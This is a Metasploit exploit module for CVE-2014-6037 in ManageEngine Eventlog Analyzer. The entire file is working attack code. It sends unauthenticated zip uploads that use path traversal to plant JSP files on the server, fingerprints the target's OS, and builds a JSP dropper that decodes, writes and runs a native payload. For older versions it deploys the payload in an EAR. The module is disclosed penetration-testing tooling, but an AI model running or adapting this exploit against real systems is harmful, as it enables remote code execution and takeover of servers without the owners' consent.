##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ManageEngine Eventlog Analyzer Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in ManageEngine Eventlog Analyzer.
        The vulnerability exists in the agentUpload servlet which accepts unauthenticated
        file uploads and handles zip file contents in a insecure way. By combining both
        weaknesses a remote attacker can achieve remote code execution. This module has been
        tested successfully on versions v7.0 - v9.9 b9002 in Windows and Linux. Versions
        between 7.0 and < 8.1 are only exploitable via EAR deployment in the JBoss server,
        while versions 8.1+ are only exploitable via a JSP upload.
      },
      'Author'       =>
        [
          'h0ng10',                              # Vulnerability discovery
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2014-6037' ],
          [ 'OSVDB', '110642' ],
          [ 'URL', 'https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Aug/86' ]
        ],
      'DefaultOptions' => { 'WfsDelay' => 5 },
      'Privileged'  => false,            # Privileged on Windows but not on Linux targets
      'Platform'    => %w{ java linux win },
      'Targets'     =>
        [
          [ 'Automatic', { } ],
          [ 'Eventlog Analyzer v7.0 - v8.0 / Java universal',
            {
              'Platform' => 'java',
              'Arch' => ARCH_JAVA,
              'WfsDelay' => 30
            }
          ],
          [ 'Eventlog Analyzer v8.1 - v9.9 b9002 / Windows',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86
            }
          ],
          [ 'Eventlog Analyzer v8.1 - v9.9 b9002 / Linux',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 31 2014'))

    register_options(
      [
        Opt::RPORT(8400),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep while we wait for EAR deployment (Java target only)', 15]),
      ], self.class)
  end


  def get_version
    res = send_request_cgi({
      'uri'    => normalize_uri("event/index3.do"),
      'method' => 'GET'
    })

    if res and res.code == 200
      if res.body =~ /ManageEngine EventLog Analyzer ([0-9]{1})/
        return $1
      end
    end

    return "0"
  end


  def check
    version = get_version
    if version >= "7" and version <= "9"
      # version 7 to < 8.1 detection
      res = send_request_cgi({
        'uri'    => normalize_uri("event/agentUpload"),
        'method' => 'GET'
      })
      if res and res.code == 405
        return Exploit::CheckCode::Appears
      end

      # version 8.1+ detection
      res = send_request_cgi({
        'uri'    => normalize_uri("agentUpload"),
        'method' => 'GET'
      })
      if res and res.code == 405 and version == 8
        return Exploit::CheckCode::Appears
      else
        # We can't be sure that it is vulnerable in version 9
        return Exploit::CheckCode::Detected
      end

    else
      return Exploit::CheckCode::Safe
    end
  end


  def create_zip_and_upload(payload, target_path, is_payload = true)
    # Zipping with CM_STORE to avoid errors decompressing the zip
    # in the Java vulnerable application
    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file(target_path, payload)

    post_data = Rex::MIME::Message.new
    post_data.add_part(zip.pack, "application/zip", 'binary', "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{Rex::Text.rand_text_alpha(4+rand(4))}.zip\"")

    data = post_data.to_s

    if is_payload
      print_status("#{peer} - Uploading payload...")
    end
    res = send_request_cgi({
      'uri'    => (@my_target == targets[1] ? normalize_uri("/event/agentUpload") : normalize_uri("agentUpload")),
      'method' => 'POST',
      'data'   => data,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if res and res.code == 200 and res.body.empty?
      if is_payload
        print_status("#{peer} - Payload uploaded successfully")
      end
      register_files_for_cleanup(target_path.gsub("../../", "../"))
      return true
    else
      return false
    end
  end


  def pick_target
    return target if target.name != 'Automatic'

    print_status("#{peer} - Determining target")

    version = get_version

    if version == "7"
      return targets[1]
    end

    os_finder_payload = %Q{<html><body><%out.println(System.getProperty("os.name"));%></body><html>}
    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"
    target_dir = "../../webapps/event/"
    if not create_zip_and_upload(os_finder_payload, target_dir + jsp_name, false)
      if version == "8"
        # Versions < 8.1 do not have a Java compiler, but can be exploited via the EAR method
        return targets[1]
      end
      return nil
    end

    res = send_request_cgi({
      'uri'    => normalize_uri(jsp_name),
      'method' => 'GET'
    })

    if res and res.code == 200
      if res.body.to_s =~ /Windows/
        return targets[2]
      else
        # assuming Linux
        return targets[3]
      end
    end

    return nil
  end


  def generate_jsp_payload
    opts = {:arch => @my_target.arch, :platform => @my_target.platform}
    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)
    exe = generate_payload_exe(opts)
    base64_exe = Rex::Text.encode_base64(exe)

    native_payload_name = rand_text_alpha(rand(6)+3)
    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'

    var_raw     = rand_text_alpha(rand(8) + 3)
    var_ostream = rand_text_alpha(rand(8) + 3)
    var_buf     = rand_text_alpha(rand(8) + 3)
    var_decoder = rand_text_alpha(rand(8) + 3)
    var_tmp     = rand_text_alpha(rand(8) + 3)
    var_path    = rand_text_alpha(rand(8) + 3)
    var_proc2   = rand_text_alpha(rand(8) + 3)

    if @my_target['Platform'] == 'linux'
      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
      chmod = %Q|
      Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
      Thread.sleep(200);
      |

      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
      cleanup = %Q|
      Thread.sleep(200);
      Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
      |
    else
      chmod = ''
      cleanup = ''
    end

    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    try {
      String #{var_buf} = "#{base64_exe}";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |

    jsp = jsp.gsub(/\n/, '')
    jsp = jsp.gsub(/\t/, '')
    jsp = jsp.gsub(/\x0d\x0a/, "")
    jsp = jsp.gsub(/\x0a/, "")

    return jsp
  end


  def exploit_native
    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.
    # Fail if this is the case and ask the user to select an appropriate payload.
    if @my_target['Platform'] == 'linux' and payload_instance.name =~ /Windows/
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
    end

    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"
    target_dir = "../../webapps/event/"

    jsp_payload = generate_jsp_payload
    if not create_zip_and_upload(jsp_payload, target_dir + jsp_name)
      fail_with(Failure::Unknown, "#{peer} - Payload upload failed")
    end

    return jsp_name
  end


  def exploit_java
    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.
    # Fail if this is the case and ask the user to select an appropriate payload.
    if @my_target['Platform'] == 'java' and not payload_instance.name =~ /Java/
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Java target.")
    end

    target_dir = "../../server/default/deploy/"

    # First we generate the WAR with the payload...
    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => war_app_base })

    # ... and then we create an EAR file that will contain it.
    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    app_xml = %Q{<?xml version="1.0" encoding="UTF-8"?><application><display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name><module><web><web-uri>#{war_app_base + ".war"}</web-uri><context-root>/#{ear_app_base}</context-root></web></module></application>}

    # Zipping with CM_STORE to avoid errors while decompressing the zip
    # in the Java vulnerable application
    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    ear_file.add_file(war_app_base + ".war", war_payload.to_s)
    ear_file.add_file("META-INF/application.xml", app_xml)
    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + ".ear"

    if not create_zip_and_upload(ear_file.pack, target_dir + ear_file_name)
      fail_with(Failure::Unknown, "#{peer} - Payload upload failed")
    end

    print_status("#{peer} - Waiting " + datastore['SLEEP'].to_s + " seconds for EAR deployment...")
    sleep(datastore['SLEEP'])
    return normalize_uri(ear_app_base, war_app_base, rand_text_alphanumeric(4 + rand(32 - 4)))
  end


  def exploit
    @my_target = pick_target
    if @my_target.nil?
      print_error("#{peer} - Unable to select a target, we must bail.")
      return
    else
      print_status("#{peer} - Selected target #{@my_target.name}")
    end

    if @my_target == targets[1]
      exploit_path = exploit_java
    else
      exploit_path = exploit_native
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      'uri'    => normalize_uri(exploit_path),
      'method' => 'GET'
    })
  end
end
